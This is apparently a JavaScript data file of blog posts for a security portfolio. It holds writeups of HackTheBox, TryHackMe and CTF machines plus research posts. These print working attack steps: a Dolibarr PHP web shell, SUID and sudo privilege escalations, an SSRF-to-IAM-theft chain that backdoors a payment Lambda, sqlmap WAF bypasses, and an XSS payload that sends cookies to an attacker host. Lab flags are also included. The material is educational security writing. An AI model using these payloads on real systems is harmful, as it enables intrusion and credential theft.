/**
 * ╔══════════════════════════════════════════════════════════════╗
 * ║         CYBER//PORTFOLIO — BLOG POSTS & WRITEUPS             ║
 * ║                                                              ║
 * ║  Add a new object to POSTS[] to publish a new post.          ║
 * ║  Supports: <h3> <p> <pre><code> <code> <div class="flag-box">║
 * ╚══════════════════════════════════════════════════════════════╝
 *
 * FIELDS:
 *   id         — unique slug (no spaces)
 *   title      — post title
 *   date       — "YYYY-MM-DD"
 *   difficulty — "easy" | "medium" | "hard" | "insane"
 *   platform   — "HackTheBox" | "TryHackMe" | "CTF" | "Research" | "VulnHub"
 *   tags       — array of strings (auto-builds filter buttons)
 *   excerpt    — shown on card
 *   content    — full HTML writeup body
 *   flags      — { user, root } optional
 */

const POSTS = [
  {
    id: "htb-boardlight",
    title: "HackTheBox: BoardLight — Dolibarr RCE & Enlightenment Privesc",
    date: "2025-03-15",
    difficulty: "medium",
    platform: "HackTheBox",
    tags: ["htb", "linux", "web", "rce", "privesc", "dolibarr", "enlightenment"],
    excerpt: "Exploiting CVE-2023-30253 in Dolibarr CRM for initial foothold, then abusing a SUID Enlightenment binary (CVE-2022-37706) for privilege escalation to root.",
    flags: { user: "a2d3f1...REDACTED", root: "9f4e2b...REDACTED" },
    content: `
      <h3>Reconnaissance</h3>
      <p>Starting with a full port scan to map the attack surface.</p>
      <pre><code>nmap -sC -sV -p- --min-rate 5000 -oN boardlight.nmap 10.10.11.11
# Open: 22/tcp ssh OpenSSH 8.2, 80/tcp http Apache 2.4.52</code></pre>
      <p>Vhost fuzzing revealed <code>crm.board.htb</code> running <strong style="color:var(--accent)">Dolibarr 17.0.0</strong>.</p>

      <h3>Initial Foothold — CVE-2023-30253</h3>
      <p>Default credentials <code>admin:admin</code> granted access. Dolibarr 17.0.0 allows PHP code injection via uppercase <code>&lt;?PHP</code> tags bypassing the filter in dynamic content pages.</p>
      <pre><code># Create malicious website page in Dolibarr
# Content: &lt;?PHP system($_GET['c']); ?&gt;

# Trigger via direct URL
curl "http://crm.board.htb/public/website/index.php?website=site&pageref=shell&c=id"
# uid=33(www-data)</code></pre>

      <h3>Lateral Movement — Credential Reuse</h3>
      <pre><code>grep -r "password" /var/www/html/dolibarr/conf/
# DB_PASSWORD = 'serverfun2$'
su larissa   # password reuse — success</code></pre>

      <h3>Privilege Escalation — CVE-2022-37706</h3>
      <pre><code>find / -perm -4000 2>/dev/null | grep enlightenment
# /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys

# Path traversal exploit
enlightenment_sys /bin/mount // --o noexec,nosuid,uid=0 \
  "/../../../../../../../tmp/exploit"
# root shell obtained</code></pre>
      <div class="flag-box">🚩 root: 9f4e2b...REDACTED</div>
    `,
  },
  {
    id: "research-ssrf-rce",
    title: "SSRF → IMDSv1 → IAM Credential Theft → RCE on Lambda",
    date: "2025-01-20",
    difficulty: "hard",
    platform: "Research",
    tags: ["research", "web", "ssrf", "rce", "aws", "cloud", "iam", "lambda"],
    excerpt: "Chaining an SSRF bug through the AWS Instance Metadata Service to steal IAM credentials, then abusing Lambda update permissions to achieve remote code execution.",
    content: `
      <h3>The SSRF Entry Point</h3>
      <p>A URL preview feature reflected server-side fetched content. IMDSv1 was enabled — no token required.</p>
      <pre><code># Step 1 — confirm SSRF
GET /preview?url=http://169.254.169.254/latest/meta-data/

# Step 2 — IAM role name
GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 3 — steal keys
GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-S3Role
# Returns: AccessKeyId, SecretAccessKey, Token</code></pre>

      <h3>Lateral Movement via Stolen IAM</h3>
      <pre><code>aws configure --profile victim
# Enter stolen keys + session token

aws sts get-caller-identity --profile victim
aws lambda list-functions --profile victim
aws iam get-role-policy --role EC2-S3Role --profile victim
# Policy includes: lambda:UpdateFunctionCode ← jackpot</code></pre>

      <h3>RCE via Lambda Backdoor</h3>
      <pre><code># malicious lambda_function.py
import subprocess
def handler(event, context):
    return subprocess.check_output(event['cmd'], shell=True).decode()

zip payload.zip lambda_function.py
aws lambda update-function-code \
  --function-name ProcessPayments \
  --zip-file fileb://payload.zip --profile victim

aws lambda invoke --function-name ProcessPayments \
  --payload '{"cmd":"id"}' out.json --profile victim</code></pre>
      <div class="flag-box">💰 Impact: Full RCE on production payment processing Lambda</div>
    `,
  },
  {
    id: "ctf-sqli-waf-bypass",
    title: "CTF: Blind SQLi + WAF Bypass to Admin Takeover",
    date: "2024-12-05",
    difficulty: "easy",
    platform: "CTF",
    tags: ["ctf", "web", "sqli", "waf", "sqlmap", "mysql", "bypass"],
    excerpt: "Time-based blind SQL injection on a login form with WAF protection — bypassed using chunked encoding tamper scripts to dump admin credentials.",
    content: `
      <h3>Discovery</h3>
      <p>The login form showed a 5s delay on <code>'</code> input vs 0.3s normal — classic time-based blind SQLi.</p>
      <pre><code>username=admin'-- -&password=x   # 5.2s response</code></pre>

      <h3>WAF Fingerprinting & Bypass</h3>
      <pre><code># Modsec WAF detected — blocks SLEEP, UNION, SELECT
# Bypass: charunicodeescape + space2comment tampers

sqlmap -u "http://target/login" \
  --data "username=*&password=x" \
  --technique=T \
  --tamper=charunicodeescape,space2comment \
  --dbms=mysql --level=5 --risk=3 \
  --dump -T users -C username,password_hash</code></pre>

      <h3>Hash Crack & Flag</h3>
      <pre><code>hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# admin:password123

# Login → admin panel → flag exposed in dashboard</code></pre>
      <div class="flag-box">🚩 flag{bl1nd_4s_4_b4t_but_st1ll_4_w1n}</div>
    `,
  },
  {
    id: "research-xss-csp",
    title: "DOM XSS + Strict CSP Bypass via JSONP Endpoint",
    date: "2024-10-01",
    difficulty: "hard",
    platform: "Research",
    tags: ["research", "web", "xss", "csp", "bypass", "javascript", "bug-bounty"],
    excerpt: "Exploiting DOM-based XSS on a target with strict CSP by finding a whitelisted JSONP endpoint on apis.google.com to exfiltrate session tokens — $3,500 bounty.",
    content: `
      <h3>DOM Sink Analysis</h3>
      <p>The search page passed <code>location.hash</code> directly into <code>innerHTML</code> without sanitization.</p>
      <pre><code>// Vulnerable source → sink
document.getElementById('r').innerHTML =
  decodeURIComponent(location.hash.slice(1));

// Basic PoC
https://target.com/search#&lt;img src=x onerror=alert(origin)&gt;</code></pre>

      <h3>CSP Analysis & JSONP Bypass</h3>
      <pre><code>Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://apis.google.com;
  object-src 'none'

# apis.google.com exposes a JSONP callback endpoint
# /js/plusone.js?onload=CALLBACK_NAME</code></pre>
      <pre><code># Final exploit URL (URL-encoded for hash)
https://target.com/search#&lt;script
  src="https://apis.google.com/js/plusone.js?onload=
  fetch('https://evil.attacker.io/?c='+document.cookie)"&gt;
&lt;/script&gt;</code></pre>

      <h3>Session Token Exfiltration</h3>
      <p>Victim visits crafted URL → CSP allows the Google script → JSONP callback executes our payload → session cookie exfiltrated.</p>
      <div class="flag-box">💰 Bounty awarded: $3,500 — High severity</div>
    `,
  },
  {
    id: "htb-broker",
    title: "HackTheBox: Broker — ActiveMQ RCE & sudo nginx Privesc",
    date: "2024-11-12",
    difficulty: "easy",
    platform: "HackTheBox",
    tags: ["htb", "linux", "activemq", "cve", "rce", "sudo", "nginx", "java"],
    excerpt: "CVE-2023-46604 unauthenticated RCE on Apache ActiveMQ 5.15.15, then reading root flag via a misconfigured sudo nginx rule serving arbitrary filesystem paths.",
    content: `
      <h3>CVE-2023-46604 — ActiveMQ RCE</h3>
      <p>Apache ActiveMQ's OpenWire protocol (port 61616) deserializes a ClassInfo header — leading to unauthenticated RCE.</p>
      <pre><code>git clone https://github.com/X1r0z/ActiveMQ-RCE
python exploit.py -i 10.10.11.243 -u http://10.10.14.x/poc.xml
# poc.xml triggers ClassPathXmlApplicationContext loading</code></pre>

      <h3>Sudo Misconfiguration</h3>
      <pre><code>sudo -l
# (root) NOPASSWD: /usr/sbin/nginx

cat &lt;&lt;'EOF' &gt; /tmp/evil.conf
user root;
events {}
http { server {
  listen 9999;
  root /;
  autoindex on;
}}
EOF

sudo /usr/sbin/nginx -c /tmp/evil.conf
curl http://localhost:9999/root/root.txt</code></pre>
      <div class="flag-box">🚩 root: [solve it — the path is clear]</div>
    `,
  },
  {
    id: "thm-mr-robot",
    title: "TryHackMe: Mr. Robot CTF — All 3 Keys",
    date: "2024-08-20",
    difficulty: "medium",
    platform: "TryHackMe",
    tags: ["thm", "linux", "wordpress", "hydra", "nmap", "ctf", "suid"],
    excerpt: "A Mr. Robot themed room covering WordPress credential brute-force, PHP reverse shell via theme editor, and SUID nmap for the root shell.",
    content: `
      <h3>Recon → Key 1</h3>
      <pre><code>gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/medium.txt
# /robots.txt → key-1-of-3.txt + fsocity.dic wordlist</code></pre>
      <div class="flag-box">🚩 Key 1: 073403c8a58a1f80d943455fb30724b9</div>

      <h3>WordPress Brute-force → Shell</h3>
      <pre><code># Username enumeration revealed: Elliot
hydra -l Elliot -P fsocity.dic target http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"

# Upload PHP reverse shell via Appearance → Theme Editor → 404.php
curl http://target/wp-content/themes/twentyfifteen/404.php</code></pre>

      <h3>Root via SUID nmap</h3>
      <pre><code>find / -perm -4000 2>/dev/null
# /usr/local/bin/nmap (version 3.81 — interactive mode exists)

nmap --interactive
nmap> !sh
# root#</code></pre>
      <div class="flag-box">🚩 Key 3: 04787ddef27c3dee1ee161b21670b4e4</div>
    `,
  },
];

const ALL_TAGS = [...new Set(POSTS.flatMap(p => p.tags))].sort();
